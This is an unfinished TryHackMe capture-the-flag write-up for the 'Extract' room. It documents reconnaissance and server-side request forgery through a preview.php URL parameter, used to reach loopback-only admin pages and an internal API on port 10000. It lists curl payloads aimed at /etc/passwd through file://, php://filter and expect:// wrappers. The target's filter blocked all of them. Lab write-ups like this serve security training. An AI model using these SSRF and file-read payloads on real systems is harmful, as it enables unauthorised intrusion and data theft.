# Extract — Write-up  import = It's under construction

**Platform:** TryHackMe  
**Room:** Extract *(Premium)*  
**Target:** CVSSM1.v.1.4  
**Difficulty:** Hard  
**Estimated Time:** ~90 minutes  

---

## Reconnaissance

### Port Scan

```bash
└─$ nmap -n -Pn -p- --min-rate 500 -T4 <target_ip>

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
### Version Scan

```bash
└─$ nmap -n -Pn -sCV -p 22,80 <target_ip>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: TryBookMe - Online Library
|_http-server-header: Apache/2.4.58 (Ubuntu)
```

### Directory Enumeration

```bash
└─$ gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt 
=====================================================================================

index.php            (Status: 200) [Size: 1735]
javascript           (Status: 301) [Size: 319] [--> http://<target_ip>/javascript/]
management           (Status: 301) [Size: 319] [--> http://<target_ip>/management/]
pdf                  (Status: 301) [Size: 312] [--> http://<target_ip>/pdf/]
server-status        (Status: 403) [Size: 278]
```

#### Client-Side Exposure of Server-Side Functionality

Inspection of the public index.php source code revealed client-side JavaScript that exposes a backend endpoint responsible for loading PDF documents. The application uses a JavaScript function to dynamically construct a request to preview.php, passing a user-controlled URL as a parameter.

***/index.php***

```html
<li class='list-group-item'>
  <a onclick="openPdf('http://cvssm1/pdf/dummy.pdf')">Dummy</a>
</li>
<li class='list-group-item'>
  <a onclick="openPdf('http://cvssm1/pdf/lorem.pdf')">Lorem</a>
</li>

<script>
function openPdf(url) {
    const iframe = document.getElementById('pdfFrame');
    iframe.src = 'preview.php?url=' + encodeURIComponent(url);
    iframe.style.display = 'block';
}
</script>
```

### baseline: preview.php - Fetches Remote Content

This confirms the backend fetches the resource specified in the url parameter and returns it to the client.

```bash
─$ curl -i http://<target_ip>/preview.php?url=http://cvssm1/pdf/dummy.pdf

HTTP/1.1 200 OK
Content-Type: application/pdf

Warning: Binary output can mess up your terminal. Use "--output -" to tell curl to output it to your terminal anyway, or consider "--output <FILE>" to save to a file.
```
### SSRF Validation: Loopback Access

This confirms that the backend accepts a user-controlled URL and successfully performs a server-side request to the loopback interface (127.0.0.1), returning the fetched content to the client.

```bash
─$ curl -i http://<target_ip>/preview.php?url=http://127.0.0.1/pdf/dummy.pdf
HTTP/1.1 200 OK
Content-Type: application/pdf

Warning: Binary output can mess up your terminal. Use "--output -" to tell curl to output it to your terminal anyway, or consider "--output <FILE>" to save to a file.
```

### Internal Context Confirmation: Loopback Web Service

This confirms that requests directed to the loopback interface (127.0.0.1:80) reach the same Apache web service exposed on port 80, establishing the internal context for subsequent testing of locally restricted endpoints.

```bash
└─$ curl -i http://<target_ip>/preview.php?url=http://127.0.0.1/
HTTP/1.1 200 OK
Content-Length: 1735
Content-Type: text/html; charset=UTF-8
# Response body identical to the externally accessible index.php
```

### SSRF Exploitation: Local-Only Endpoint Access

This confirms that the SSRF vulnerability allows bypassing local-only access controls, granting access to administrative Apache endpoints restricted to the loopback interface.

```bash
─$ curl -i http://<target_ip>/preview.php?url=http://127.0.0.1/server-status

HTTP/1.1 200 OK
Content-Length: 4369
Content-Type: text/html; charset=ISO-8859-1
Observed:
Apache server-status page returned
Endpoint previously inaccessible externally
```
### SSRF Impact: Access to Internal Management Interface

This confirms that the SSRF vulnerability allows access to the internal management interface by bypassing network-based access restrictions, exposing the application’s authentication surface.

```bash
curl -i "http://<target_ip>/preview.php?url=http://127.0.0.1/management"

Observed:
200 OK
Internal management login page returned
Endpoint inaccessible via direct external access
```

> The SSRF vector is limited to GET requests, as it is triggered through an iframe source and does not preserve authentication context.

### SSRF Enumeration: Management Assets Check

This indicates that no assets directory is present under the internal management path.

```bash
curl -i "http://<target_ip>/preview.php?url=http://127.0.0.1/management/assets"

Observed:
200 OK (proxy response)
Apache 404 Not Found for /management/assets
```

### SSRF Enumeration: Management Root Normalization

This confirms that the management interface does not expose additional unauthenticated paths through simple URL normalization.

```bash
curl -i "http://<target_ip>/preview.php?url=http://127.0.0.1/management/"

Observed:
200 OK
Identical login page returned for both /management and /management/
```
```text
Internal directory fuzzing was performed via the SSRF primitive against
the `/management/` endpoint.  

Most responses matched known error patterns (404 and login page).  
No additional valid internal endpoints were identified through this approach.
```
### Internal Port Enumeration via SSRF

This confirms the presence of an additional HTTP service listening on 127.0.0.1:10000, accessible only via the SSRF vector and not exposed externally.

```bash
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Infrastructure/Ports-1-To-65535.txt -u http://<target_ip>/preview.php?url=http://127.0.0.1:FUZZ -fs 0

Result:
Port 80 returned the expected web application content.
Port 10000 returned a distinct HTTP response with a significantly larger payload.
```
### Discovery of an Internal API Service (Port 10000)

The page identifies itself as “TryBookMe API” with the description “API Service for TryBookMe” and exposes navigation links suggesting additional routes (e.g., /customapi).

```bash
─$ curl -i http://<target_ip>/preview.php?url=http://127.0.0.1:10000/


Observed:
200 OK
Content-Type: text/html; charset=utf-8
Distinct response size compared to the main web application
Frontend assets served from /_next/static/, indicating a modern framework (Next.js / React)
"buildId":"k9Pjo5x24QkUE90SdyHNw"
```

The response revealed a TryBookMe API interface implemented with Next.js, as indicated by the presence of _next static assets:

```bash
└─$ curl -s http://<target_ip>/preview.php?url=http://127.0.0.1:10000/ | grep -oP  'src="[^"]+"'
src="/_next/static/chunks/fd9d1056-ffbd49fae2ee76ea.js"
src="/_next/static/chunks/472-22e55b21ed910619.js"
src="/_next/static/chunks/main-app-321a014647b5278e.js"
src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"
src="/_next/static/chunks/webpack-8fc0c21e0210cbd2.js"
```

then attempted to fetch one of these JavaScript bundles directly via SSRF:

```bash
curl -sI "http://<target_ip>/preview.php?url=http://127.0.0.1:10000/_next/static/chunks/main-app-321a014647b5278e.js"

HTTP/1.1 200 OK
Server: Apache/2.4.58 (Ubuntu)
Content-Type: text/html; charset=utf-8
```
This shows that the _next/static/... path is being handled by the application router and returns the generic 404 page rather than exposing the raw JS bundle. As a result, I could identify the framework and internal UI, but could not easily inspect the client-side code via SSRF.

### Wrapper and SSRF Filter Tests

To assess potential usage of alternative schemes in the url= parameter of the preview.php endpoint, several PHP stream wrappers and non-standard URL schemes were tested.

#### Active Filter Behavior

The following payloads were explicitly blocked by the backend, responding with: URL blocked due to keyword:

```bash
curl -s "http://<target>/preview.php?url=File:///etc/passwd"
curl -s "http://<target>/preview.php?url=File%3A%2F//etc/passwd"
curl -s "http://<target>/preview.php?url=File%3A%2F%2F%2Fetc/passwd"
curl -s "http://<target>/preview.php?url=php://filter/resource=/etc/passwd"
curl -s "http://<target>/preview.php?url=data://text/plain;base64,..."
curl -i "http://<target>/preview.php?url=expect://id"
```
The target implements a keyword-based blacklist filter on the url= parameter of preview.php, effectively blocking standard local file or wrapper exploitation vectors. Observations include:

* Filtering applies to the decoded URL, not just raw input;
* Only http:// and https:// schemes are accepted;
* Indirect SSRF to internal services remains a valid exploration path.

To be continue.


Written by Nelson Hirt